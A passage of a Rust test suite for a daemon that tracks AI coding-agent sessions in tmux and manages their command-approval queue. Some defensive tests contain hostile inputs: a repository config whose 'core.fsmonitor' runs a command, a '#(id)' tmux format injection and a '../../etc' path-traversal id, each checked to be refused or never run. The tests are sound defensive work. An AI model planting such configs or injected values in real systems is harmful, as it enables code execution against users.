    assert_eq!(bench.snapshot()[0]["state"], "waiting");
    assert_eq!(bench.snapshot()[0]["request"], "");
}

#[test]
fn reports_without_an_input_flag_preserve_question_protection() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Which option?", "needs_input": true, "tmux_pane": "%5"}));
    bench.report(SESSION_A, json!({"apps": "figcraft:on"}));
    bench.world.borrow_mut().pane_tails.insert("%5".into(), "❯ \n".into());
    bench.registry.reconcile_with_panes();
    assert_eq!(bench.snapshot()[0]["state"], "needs-you");
}

#[test]
fn after_a_daemon_restart_idle_sessions_can_still_be_picked_for_a_team() {
    // Live smoke test 2026-10-20: after a restart only sessions that reported again were offered.
    let bench = team_bench();
    bench.world.borrow_mut().live_ids.extend([SESSION_A, SESSION_B, OPENCODE_SESSION].map(String::from));
    let mut restored = Registry::new(Box::new(FakeSystem(bench.world.clone())), Box::new(FakeBanners(bench.shown.clone())));
    let snapshot = crate::teams::host(&mut restored, std::process::id(), cockpit::teams::HostRequest::Snapshot).unwrap().result.unwrap();
    assert_eq!(snapshot["sessions"].as_array().unwrap().len(), 3, "{snapshot}");
}

#[test]
fn a_launch_that_ended_while_the_daemon_was_down_is_not_restored() {
    let bench = team_bench();
    bench.world.borrow_mut().live_ids.extend([SESSION_A, SESSION_B, OPENCODE_SESSION].map(String::from));
    bench.world.borrow_mut().sender_runtimes.remove(&10);
    let mut restored = Registry::new(Box::new(FakeSystem(bench.world.clone())), Box::new(FakeBanners(bench.shown.clone())));
    let snapshot = crate::teams::host(&mut restored, std::process::id(), cockpit::teams::HostRequest::Snapshot).unwrap().result.unwrap();
    let sessions: Vec<_> = snapshot["sessions"].as_array().unwrap().iter().map(|row| row["session_id"].clone()).collect();
    assert!(!sessions.contains(&json!(SESSION_A)), "{sessions:?}");
    assert_eq!(sessions.len(), 2);
}

#[test]
fn a_daemon_restart_preserves_an_explicit_question() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Which option?", "needs_input": true, "tmux_pane": "%5"}));
    bench.world.borrow_mut().live_ids.insert(SESSION_A.into());
    let mut restored = Registry::new(Box::new(FakeSystem(bench.world.clone())), Box::new(FakeBanners(bench.shown.clone())));
    bench.world.borrow_mut().pane_tails.insert("%5".into(), "❯ \n".into());
    restored.reconcile_with_panes();
    assert_eq!(restored.snapshot_rows()[0]["state"], "needs-you");
    assert_eq!(restored.snapshot_rows()[0]["request"], "Which option?");
}

#[test]
fn an_explicit_question_replaces_stale_permission_detail() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Permission?", "tmux_pane": "%5"}));
    bench.world.borrow_mut().pane_tails.insert("%5".into(), " Bash command\n   npm test\n Do you want to proceed?\n ❯ 1. Yes\n".into());
    bench.registry.reconcile_with_panes();
    assert_eq!(bench.snapshot()[0]["detail"], "Bash command · npm test");
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Which option?", "needs_input": true}));
    assert_eq!(bench.snapshot()[0]["detail"], "");
    assert_eq!(bench.snapshot()[0]["request"], "Which option?");
}

#[test]
fn an_input_flag_change_is_published_even_when_the_question_did_not_change() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Which option?"}));
    bench.report(SESSION_A, json!({"needs_input": true}));
    assert_eq!(bench.snapshot()[0]["needs_input"], true);
}

#[test]
fn an_input_flag_must_be_boolean() {
    for flag in [json!("true"), json!(1), Value::Null] {
        let result = parse_session(&json!({"session": SESSION_A, "project": "p", "needs_input": flag}).to_string());
        assert!(result.is_err(), "{result:?}");
    }
}

#[test]
fn an_acknowledged_session_report_updates_its_authenticated_card() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_targets.insert(500, target(&[("tmux_pane", "%7")]));
    let payload = json!({"session": SESSION_A, "project": "p", "state": "needs-you", "message": "Which option?", "needs_input": true});
    assert!(bench.registry.request_from("session-request", &payload.to_string(), 500).is_ok());
    assert_eq!(bench.snapshot()[0]["request"], "Which option?");
    assert_eq!(bench.snapshot()[0]["tmux_pane"], "%7");
}

#[test]
fn an_acknowledged_session_report_is_refused_without_a_trusted_sender() {
    let mut bench = Bench::new();
    let payload = json!({"session": SESSION_A, "project": "p", "state": "needs-you", "message": "Which option?", "needs_input": true});
    assert!(bench.registry.request_from("session-request", &payload.to_string(), 777).is_err());
    assert!(bench.registry.sessions.is_empty());
}

#[test]
fn command_chat_ownership_comes_from_the_authenticated_pane_not_the_claim() {
    for (pane, expected) in [("%7", json!(SESSION_A)), ("%8", Value::Null)] {
        let mut bench = Bench::new();
        bench.report(SESSION_A, json!({"state": "waiting", "tmux_pane": "%7"}));
        bench.world.borrow_mut().sender_targets.insert(500, target(&[("tmux_pane", pane)]));
        let folder = bench.fixture.root.join("project");
        fs::create_dir_all(&folder).unwrap();
        let key = answers_key_of(&folder);
        bench.world.borrow_mut().sender_directories.insert(500, folder.display().to_string());
        let raw = json!({"id": "1123456789ab", "session": SESSION_A, "verified_session": SESSION_A,
            "command": "true", "answers": key}).to_string();
        bench.registry.request_from("run-request", &raw, 500).unwrap();
        let held = cockpit::util::read_json(&cockpit::approval::held_request("1123456789ab", "request")).unwrap();
        assert_eq!(held["verified_session"], expected, "pane {pane}");
    }
}

#[test]
fn the_daemon_writes_its_messages_to_the_shared_log() {
    let fixture = Fixture::new();
    log("session aaaaaaaa (runway) is gone, dropping it");
    let text = fs::read_to_string(fixture.root.join("state/cockpit/log")).unwrap();
    let line = text.lines().last().unwrap();
    assert!(regex::Regex::new(r"[+-]\d\d:\d\d INFO daemon: session aaaaaaaa \(runway\) is gone, dropping it$").unwrap().is_match(line), "{line}");
}

#[test]
fn a_waiting_session_carries_what_it_asks_until_it_moves_on() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Claude needs your permission to use Bash", "sticky": true}));
    assert_eq!(bench.snapshot()[0]["request"], "Claude needs your permission to use Bash");
    {
        let mut world = bench.world.borrow_mut();
        world.claude_panes = set(&["%5"]);
        world.pane_tails.insert("%5".into(), " Bash command\n   npm test\n Do you want to proceed?\n ❯ 1. Yes\n".into());
    }
    bench.report(SESSION_A, json!({"tmux_pane": "%5"}));
    bench.registry.prune_dead();
    assert_eq!(bench.snapshot()[0]["detail"], "Bash command · npm test");
    bench.world.borrow_mut().pane_tails.insert("%5".into(), "✻ Flowing… (2s)\n".into());
    bench.report(SESSION_A, json!({"state": "working"}));
    let row = &bench.snapshot()[0];
    assert_eq!((row["request"].as_str(), row["detail"].as_str()), (Some(""), Some("")));
}

#[test]
fn banners_wait_for_the_end_of_a_meeting() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().in_meeting = true;
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Claude needs your permission to use Bash", "sticky": true}));
    assert!(bench.raised().is_empty());
    bench.world.borrow_mut().in_meeting = false;
    bench.registry.prune_dead();
    assert_eq!(bench.raised(), [SESSION_A]);
}

#[test]
fn sessions_are_remembered_across_reboots() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": "/r/runway", "project": "runway"}));
    bench.report(SESSION_A, json!({"state": "gone"}));
    let recent = cockpit::util::read_json(&cockpit::paths::recent_sessions()).unwrap();
    assert_eq!((recent[SESSION_A]["project"].as_str(), recent[SESSION_A]["cwd"].as_str()), (Some("runway"), Some("/r/runway")));
}

#[test]
fn a_finished_turn_shows_what_the_hook_found_it_did() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working"}));
    bench.report(SESSION_A, json!({"state": "waiting", "message": "Finished, waiting for you", "outcome": "1 commit · 1 file changed, +2 −0 uncommitted"}));
    assert_eq!(bench.snapshot()[0]["outcome"], "1 commit · 1 file changed, +2 −0 uncommitted");
}

#[test]
fn a_new_turn_forgets_the_last_outcome() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "message": "Finished, waiting for you", "outcome": "no changes"}));
    bench.report(SESSION_A, json!({"state": "working"}));
    assert_eq!(bench.snapshot()[0]["outcome"], "");
}

#[test]
fn an_outcome_with_a_tmux_format_is_refused() {
    assert!(parse_session(&json!({"session": SESSION_A, "project": "p", "outcome": "#(id)"}).to_string()).is_err());
}

#[test]
fn the_daemon_never_runs_git_on_a_session_folder() {
    // A session can write its repository's configuration (core.fsmonitor, filters): git run out
    // here on its folder would run that as Theo. The project is read from the .git files instead.
    let mut bench = Bench::new();
    let repository = bench.fixture.root.join("evil");
    fs::create_dir_all(repository.join(".git")).unwrap();
    let ran = bench.fixture.root.join("ran");
    fs::write(repository.join(".git/config"), format!("[core]\n\tfsmonitor = touch {}\n", ran.display())).unwrap();
    let cwd = repository.to_string_lossy().into_owned();
    bench.report(SESSION_A, json!({"state": "working", "cwd": cwd}));
    bench.report(SESSION_A, json!({"state": "waiting", "message": "Finished, waiting for you"}));
    assert!(!ran.exists());
    assert_eq!(bench.snapshot()[0]["project"], "evil");
}

#[test]
fn a_banner_left_up_while_the_session_works_is_removed() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Claude needs your permission to use Bash", "sticky": true}));
    // The report that should have removed it was missed.
    bench.registry.sessions.get_mut(SESSION_A).unwrap().state = "working".into();
    bench.registry.prune_dead();
    assert!(bench.dropped().contains(&SESSION_A.to_string()));
}

/// A checkout at `path` (a .git folder), as git leaves it, without running git.
fn checkout(path: &Path) {
    fs::create_dir_all(path.join(".git")).unwrap();
}

#[test]
fn the_project_is_the_starting_directorys_and_stays() {
    let mut bench = Bench::new();
    let main = bench.fixture.root.join("r/opusline");
    checkout(&main);
    fs::create_dir_all(main.join("apps/api")).unwrap();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": main.join("apps/api").to_string_lossy(), "project": "api"}));
    bench.report(SESSION_A, json!({"state": "working", "cwd": main.to_string_lossy(), "project": "opusline"}));
    let row = &bench.snapshot()[0];
    assert_eq!((row["project"].as_str(), row["cwd"].as_str()), (Some("opusline"), Some(main.join("apps/api").to_string_lossy().as_ref())));
    assert!(row.get("started").is_some());
}

#[test]
fn a_worktree_is_named_after_its_main_checkout() {
    let mut bench = Bench::new();
    let main = bench.fixture.root.join("r/opusline");
    checkout(&main);
    let worktree_git = main.join(".git/worktrees/feature");
    fs::create_dir_all(&worktree_git).unwrap();
    fs::write(worktree_git.join("commondir"), "../..\n").unwrap();
    let worktree = bench.fixture.root.join("w/feature");
    fs::create_dir_all(&worktree).unwrap();
    fs::write(worktree.join(".git"), format!("gitdir: {}\n", worktree_git.display())).unwrap();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": worktree.to_string_lossy(), "project": "feature"}));
    assert_eq!(bench.snapshot()[0]["project"], "opusline");
}

#[test]
fn a_folder_outside_any_repository_is_named_after_itself() {
    let mut bench = Bench::new();
    let folder = bench.fixture.root.join("notes");
    fs::create_dir_all(&folder).unwrap();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": folder.to_string_lossy()}));
    assert_eq!(bench.snapshot()[0]["project"], "notes");
}

#[test]
fn a_new_session_tags_its_window_and_publishes() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "kitty_pid": "4242"}));
    assert_eq!(bench.world.borrow().hyprctl_calls(), ["CLAUDE_WINDOW_STATE(4242, \"waiting\")"]);
    assert_eq!(bench.snapshot().iter().map(|row| row["session"].as_str().unwrap()).collect::<Vec<_>>(), [SESSION_A]);
}

#[test]
fn publishing_signals_only_the_exact_waybar_process_name() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting"}));
    assert!(bench.commands().contains(&vec!["pkill".to_string(), "-x".into(), "-RTMIN+16".into(), "waybar".into()]));
}

#[test]
fn an_unchanged_state_report_costs_nothing() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working", "kitty_pid": "1"}));
    bench.world.borrow_mut().commands.clear();
    bench.report(SESSION_A, json!({"state": "working", "kitty_pid": "1"}));
    assert!(bench.commands().is_empty());
}

#[test]
fn a_message_raises_a_banner_and_its_absence_drops_it() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "perm", "sticky": true}));
    bench.report(SESSION_A, json!({"state": "working"}));
    assert_eq!(bench.raised(), [SESSION_A]);
    assert!(bench.dropped().contains(&SESSION_A.to_string()));
}

#[test]
fn no_banner_while_the_claude_workspace_is_active() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().on_cockpit = true;
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "perm", "sticky": true}));
    assert!(bench.raised().is_empty());
}

#[test]
fn a_stateless_report_keeps_the_state() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working"}));
    bench.report(SESSION_A, json!({"message": "info"}));
    assert_eq!(bench.registry.sessions[SESSION_A].state, "working");
}

#[test]
fn a_new_id_in_the_same_pane_replaces_the_old_one() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "tmux_pane": "%5", "message": "perm", "sticky": true}));
    bench.report(SESSION_B, json!({"state": "working", "tmux_pane": "%5"}));
    assert_eq!(bench.registry.sessions.keys().collect::<Vec<_>>(), [SESSION_B]);
    assert!(bench.dropped().contains(&SESSION_A.to_string()));
}

#[test]
fn the_snapshot_orders_by_urgency() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working"}));
    bench.report(SESSION_B, json!({"state": "needs-you"}));
    assert_eq!(bench.snapshot().iter().map(|row| row["session"].as_str().unwrap()).collect::<Vec<_>>(), [SESSION_B, SESSION_A]);
}

#[test]
fn a_running_id_is_alive_and_an_older_session_falls_back_to_its_pane() {
    let mut bench = Bench::new();
    let pane = target(&[("tmux_pane", "%12")]);
    assert!(!bench.registry.is_dead(SESSION_A, &pane, &set(&[SESSION_A]), &set(&[])));
    // A pre-2.1.300 session (no id on a command line) next to a newer one keeps its pane rule.
    assert!(!bench.registry.is_dead(SESSION_B, &pane, &set(&[SESSION_A]), &set(&["%12"])));
    assert!(bench.registry.is_dead(SESSION_B, &pane, &set(&[SESSION_A]), &set(&["%3"])));
}

#[test]
fn without_ids_the_pane_decides_then_the_terminal() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().dead_pids = set(&["999999"]);
    let live = set(&["%3"]);
    assert!(!bench.registry.is_dead(SESSION_A, &target(&[("tmux_pane", "%3"), ("kitty_pid", "999999")]), &set(&[]), &live));
    assert!(bench.registry.is_dead(SESSION_A, &target(&[("tmux_pane", "%12")]), &set(&[]), &live));
    assert!(bench.registry.is_dead(SESSION_A, &target(&[("kitty_pid", "999999")]), &set(&[]), &live));
    assert!(!bench.registry.is_dead(SESSION_A, &target(&[("kitty_pid", "4242")]), &set(&[]), &live));
}

#[test]
fn prune_drops_sessions_whose_pane_lost_its_claude() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working", "tmux_pane": "%7"}));
    bench.registry.prune_dead();
    assert!(bench.registry.sessions.is_empty());
}

#[test]
fn reconcile_flags_a_session_whose_claude_updated_itself() {
    let mut bench = Bench::new();
    {
        let mut world = bench.world.borrow_mut();
        world.claude_panes = set(&["%5"]);
        world.pane_tails.insert("%5".into(), "❯ \n  ✓ Update installed · Restart to update\n".into());
    }
    bench.report(SESSION_A, json!({"state": "waiting", "tmux_pane": "%5"}));
    bench.registry.prune_dead();
    assert!(bench.registry.sessions[SESSION_A].update);
    assert_eq!(bench.snapshot()[0]["update"], true);
    bench.world.borrow_mut().pane_tails.insert("%5".into(), "❯ \n".into());
    bench.registry.prune_dead();
    assert!(!bench.registry.sessions[SESSION_A].update);
}

#[test]
fn reconcile_follows_the_pane_in_both_directions() {
    let mut bench = Bench::new();
    {
        let mut world = bench.world.borrow_mut();
        world.pane_tails = HashMap::from([("%5".into(), "✻ Flowing… (11s)\n❯ \n".into()), ("%6".into(), " Do you want to proceed?\n ❯ 1. Yes\n".into()),
                                          ("%7".into(), "done\n❯ \n".into())]);
        world.claude_panes = set(&["%5", "%6", "%7"]);
    }
    for (session, pane, state) in [(SESSION_A, "%5", "needs-you"), (SESSION_B, "%6", "working"), (SESSION_C, "%7", "needs-you")] {
        bench.report(session, json!({"state": state, "tmux_pane": pane}));
    }
    bench.registry.prune_dead();
    let states: BTreeMap<&str, &str> = bench.registry.sessions.iter().map(|(session, entry)| (&session[..8], entry.state.as_str())).collect();
    assert_eq!(states, BTreeMap::from([("aaaaaaaa", "working"), ("bbbbbbbb", "needs-you"), ("cccccccc", "waiting")]));
}

#[test]
fn an_opencode_pane_is_not_read_with_claudes_patterns() {
    // A "❯ " in opencode's screen is no idle Claude prompt: only its plugin's reports set its state.
    let mut bench = Bench::new();
    {
        let mut world = bench.world.borrow_mut();
        world.pane_tails = HashMap::from([("%5".into(), "done\n❯ \n Do you want to proceed?\n ❯ 1. Yes\n".into())]);
        world.claude_panes = set(&["%5"]);
    }
    bench.report(OPENCODE_SESSION, json!({"state": "working", "tmux_pane": "%5", "agent": "opencode"}));
    bench.registry.prune_dead();
    assert_eq!(bench.registry.sessions[OPENCODE_SESSION].state, "working");
}

#[test]
fn a_sessions_agent_is_in_the_snapshot_and_the_reboot_record_and_claude_by_default() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": "/a"}));
    bench.report(OPENCODE_SESSION, json!({"state": "waiting", "cwd": "/b", "agent": "opencode"}));
    bench.report(OPENCODE_SESSION, json!({"state": "working"}));
    let agent = |bench: &Bench, session: &str| bench.snapshot().iter().find(|row| row["session"] == session).unwrap()["agent"].clone();
    assert_eq!(agent(&bench, SESSION_A), "claude");
    assert_eq!(agent(&bench, OPENCODE_SESSION), "opencode", "a report without the field keeps it");
    let recent: Value = serde_json::from_str(&fs::read_to_string(cockpit::paths::recent_sessions()).unwrap()).unwrap();
    assert_eq!(recent[OPENCODE_SESSION]["agent"], "opencode");
}

#[test]
fn clear_forgets_everything_and_untags() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working", "kitty_pid": "1"}));
    bench.world.borrow_mut().commands.clear();
    bench.registry.clear();
    assert!(bench.registry.sessions.is_empty());
    assert_eq!(bench.world.borrow().hyprctl_calls(), ["CLAUDE_WINDOW_STATE(1, nil)"]);
}

#[test]
fn the_snapshot_survives_a_restart_and_skips_bad_rows() {
    let fixture = Fixture::new();
    cockpit::util::write_json(&cockpit::paths::snapshot(), &json!({"sessions": [
        {"session": SESSION_A, "state": "working", "project": "p", "since": 1, "tmux_pane": "%2"},
        {"session": SESSION_B, "state": "nope", "project": "p", "since": 1},
    ]})).unwrap();
    let bench = Bench::with(fixture, World { claude_panes: set(&["%2"]), ..World::default() });
    assert_eq!(bench.registry.sessions.keys().collect::<Vec<_>>(), [SESSION_A]);
}

#[test]
fn focusing_shows_the_most_urgent_session_and_drops_its_banner() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working", "tmux_pane": "%1"}));
    bench.report(SESSION_B, json!({"state": "needs-you", "tmux_pane": "%2"}));
    bench.registry.focus_most_urgent();
    assert!(bench.commands().contains(&vec!["cockpit".to_string(), "show".into(), SESSION_B.into()]));
    assert!(bench.dropped().contains(&SESSION_B.to_string()));
}

// ---- Where a session's window is ----

fn resolving_bench(client_environment: &[(&str, &str)], clients: &str) -> Bench {
    let mut world = World { session_name: Some("S\n".into()), clients: clients.into(), dead_pids: set(&["999998", "999999"]), ..World::default() };
    world.environments.insert("c1".into(), client_environment.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect());
    Bench::with(Fixture::new(), world)
}

#[test]
fn the_attached_client_names_the_live_window() {
    let mut bench = resolving_bench(&[("KITTY_PID", "4242"), ("KITTY_WINDOW_ID", "1")], "c1\n");
    let resolved = bench.registry.resolve_target(target(&[("tmux_pane", "%3"), ("kitty_pid", "999998")]));
    assert_eq!(resolved, target(&[("tmux_pane", "%3"), ("kitty_pid", "4242"), ("kitty_window", "1")]));
}

#[test]
fn dead_pids_are_dropped_not_trusted() {
    let mut bench = resolving_bench(&[("KITTY_PID", "999999")], "c1\n");
    assert_eq!(bench.registry.resolve_target(target(&[("tmux_pane", "%3"), ("kitty_pid", "999998")])), target(&[("tmux_pane", "%3")]));
}

#[test]
fn without_a_client_the_hook_values_stay() {
    let mut bench = resolving_bench(&[], "");
    let reported = target(&[("tmux_pane", "%9"), ("kitty_pid", "4242")]);
    assert_eq!(bench.registry.resolve_target(reported.clone()), reported);
}

// ---- The run queue ----

#[test]
fn ask_to_run_phases_follow_the_requesting_session_until_done() {
    let mut bench = Bench::new();
    for session in [SESSION_A, SESSION_B] {
        bench.report(session, json!({"state": "working", "cwd": "/r/same-project"}));
    }
    for (id, session) in [(RUN_A, SESSION_A), (RUN_B, SESSION_B)] {
        fs::write(cockpit::approval::held_request(id, "request"), json!({"answers": ANSWERS_KEY, "session": session}).to_string()).unwrap();
    }
    let phase = |bench: &Bench, session: &str| {
        bench.snapshot().iter().find(|row| row["session"] == session).unwrap()["ask_to_run"].clone()
    };
    bench.registry.run_request(RUN_A).unwrap();
    assert_eq!(phase(&bench, SESSION_A), "approval");
    assert_eq!(phase(&bench, SESSION_B), "");
    bench.registry.run_request(RUN_B).unwrap();
    assert_eq!(phase(&bench, SESSION_B), "approval", "queued approvals are visible too");
    bench.registry.run_phase(RUN_A, "running");
    assert_eq!(phase(&bench, SESSION_A), "running");
    bench.registry.run_phase(RUN_A, "input");
    assert_eq!(phase(&bench, SESSION_A), "input", "input remains visible while another approval is shown");
    bench.registry.run_phase(RUN_B, "done");
    assert_eq!(phase(&bench, SESSION_B), "");
    bench.registry.run_phase(RUN_A, "running");
    assert_eq!(phase(&bench, SESSION_A), "running");
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!(phase(&bench, SESSION_A), "");
}

#[test]
fn answering_a_background_command_clears_its_queued_input_status() {
    for starts_queued in [false, true] {
        let mut bench = Bench::new();
        bench.report(SESSION_A, json!({"state": "working"}));
        fs::write(cockpit::approval::held_request(RUN_A, "request"), json!({"answers": ANSWERS_KEY, "session": SESSION_A}).to_string()).unwrap();
        if starts_queued {
            bench.registry.run_request(RUN_B).unwrap();
        }
        bench.registry.run_request(RUN_A).unwrap();
        bench.registry.run_phase(RUN_A, "running");
        if !starts_queued {
            bench.registry.run_request(RUN_B).unwrap();
        }
        bench.registry.run_phase(RUN_A, "input");
        assert_eq!(bench.snapshot()[0]["ask_to_run"], "input");
        bench.registry.run_phase(RUN_A, "running");
        assert_eq!(bench.snapshot()[0]["ask_to_run"], "running", "starts_queued={starts_queued}");
        bench.registry.run_phase(RUN_B, "done");
        assert_eq!(bench.snapshot()[0]["ask_to_run"], "running", "an answered question must not be offered again");
    }
}

#[test]
fn an_abandoned_ask_to_run_disappears_from_its_session_card() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working"}));
    fs::write(cockpit::approval::held_request(RUN_A, "request"), json!({"answers": ANSWERS_KEY, "session": SESSION_A}).to_string()).unwrap();
    bench.registry.run_request(RUN_A).unwrap();
    assert_eq!(bench.snapshot()[0]["ask_to_run"], "approval");
    heartbeat(&bench, RUN_A, 600);
    bench.registry.tick_queues();
    assert_eq!(bench.snapshot()[0]["ask_to_run"], "");
}

#[test]
fn approval_takes_precedence_over_a_running_command_in_the_same_session() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working"}));
    for id in [RUN_A, RUN_B] {
        fs::write(cockpit::approval::held_request(id, "request"), json!({"answers": ANSWERS_KEY, "session": SESSION_A}).to_string()).unwrap();
    }
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "input");
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_request(RUN_B).unwrap();
    assert_eq!(bench.snapshot()[0]["ask_to_run"], "approval");
}


fn started_sessions(bench: &Bench) -> Vec<String> {
    bench.commands().iter().filter(|command| command[..2] == ["tmux", "new-session"]).map(|command| command[4].clone()).collect()
}

#[test]
fn a_bad_request_id_is_refused() {
    let mut bench = Bench::new();
    assert!(bench.registry.run_request("../../etc").is_err());
}

#[test]
fn every_request_gets_a_pane_before_the_first_is_answered() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    assert_eq!(started_sessions(&bench), ["claude-run-aaaaaaaaaaaa", "claude-run-bbbbbbbbbbbb"]);
    assert!(bench.commands().contains(&vec!["cockpit".to_string(), "approval-pane".into(), RUN_A.into()]));
    assert!(bench.commands().contains(&vec!["cockpit".to_string(), "approval-pane".into(), RUN_B.into()]));
    assert_eq!(bench.windows().len(), 1, "floating approvals still wait their turn");
}

#[test]
fn approving_hides_the_pane_until_the_command_needs_input() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    let close = vec!["cockpit".to_string(), "approval-pane".into(), "close".into(), RUN_A.into()];
    assert!(bench.commands().contains(&close), "approval pane stayed open while running");
    bench.registry.run_phase(RUN_A, "input");
    let show = vec!["cockpit".to_string(), "approval-pane".into(), RUN_A.into()];
    assert_eq!(bench.commands().iter().filter(|command| **command == show).count(), 2);
}

#[test]
fn after_an_answer_the_pane_hides_until_the_next_question() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_phase(RUN_A, "input");
    let close = vec!["cockpit".to_string(), "approval-pane".into(), "close".into(), RUN_A.into()];
    let closes_before_answer = bench.commands().iter().filter(|command| **command == close).count();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.tick_queues();
    assert_eq!(bench.commands().iter().filter(|command| **command == close).count(), closes_before_answer + 1,
               "pane stayed open after the command resumed");
    bench.registry.run_phase(RUN_A, "input");
    let show = vec!["cockpit".to_string(), "approval-pane".into(), RUN_A.into()];
    assert_eq!(bench.commands().iter().filter(|command| **command == show).count(), 3);
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!(bench.commands().iter().filter(|command| **command == close).count(), closes_before_answer + 2);
}

#[test]
fn approving_a_queued_request_hides_its_pane() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_B, "running");
    assert!(bench.commands().contains(&vec!["cockpit".to_string(), "approval-pane".into(), "close".into(), RUN_B.into()]));
}

#[test]
fn a_later_approval_can_run_and_finish_before_the_first_is_answered() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_B, "running");
    assert_eq!(bench.registry.runs.running, [RUN_B]);
    bench.registry.run_phase(RUN_B, "done");
    assert!(bench.commands().contains(&vec!["cockpit".to_string(), "approval-pane".into(), "close".into(), RUN_B.into()]));
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!(bench.registry.runs.current, "", "completed approval must not be shown again");
}

#[test]
fn a_later_approval_waiting_for_input_is_not_started_again() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_B, "running");
    bench.registry.run_phase(RUN_B, "input");
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!((bench.registry.runs.current.as_str(), bench.registry.runs.phase.as_str()), (RUN_B, "input"));
    assert_eq!(started_sessions(&bench), ["claude-run-aaaaaaaaaaaa", "claude-run-bbbbbbbbbbbb"]);
}

#[test]
fn a_later_approval_can_be_declined_without_being_shown_again() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_B, "done");
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!(bench.registry.runs.current, "");
    assert_eq!(bench.windows().len(), 1);
}

#[test]
fn a_pane_announcing_its_approval_preserves_the_floating_window_order() {
    let mut bench = Bench::new();
    let third_run = "cccccccccccc";
    fs::write(cockpit::approval::held_request(third_run, "request"), json!({"answers": ANSWERS_KEY}).to_string()).unwrap();
    for id in [RUN_A, RUN_B, third_run] {
        bench.registry.run_request(id).unwrap();
    }
    bench.registry.run_phase(RUN_B, "asking");
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!(bench.windows()[1].borrow().command.last().unwrap(), "=claude-run-bbbbbbbbbbbb");
}

#[test]
fn an_abandoned_later_approval_closes_while_the_first_still_asks() {
    let mut bench = Bench::new();
    heartbeat(&bench, RUN_A, 0);
    heartbeat(&bench, RUN_B, 0);
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    heartbeat(&bench, RUN_B, 600);
    bench.registry.tick_queues();
    assert_eq!(result_status(&bench, RUN_B).as_deref(), Some("abandoned"));
    assert!(bench.commands().contains(&vec!["cockpit".to_string(), "approval-pane".into(), "close".into(), RUN_B.into()]));
    assert_eq!(bench.registry.runs.current, RUN_A);
}

#[test]
fn a_finished_request_closes_the_pane_and_starts_the_next() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_A, "done");
    assert!(bench.commands().contains(&vec!["cockpit".to_string(), "approval-pane".into(), "close".into(), RUN_A.into()]));
    assert_eq!(bench.registry.runs.current, RUN_B);
}

#[test]
fn answering_command_input_hides_its_pane() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "input");
    bench.registry.run_phase(RUN_A, "running");
    assert!(bench.commands().contains(&vec!["cockpit".into(), "approval-pane".into(), "close".into(), RUN_A.into()]));
}

#[test]
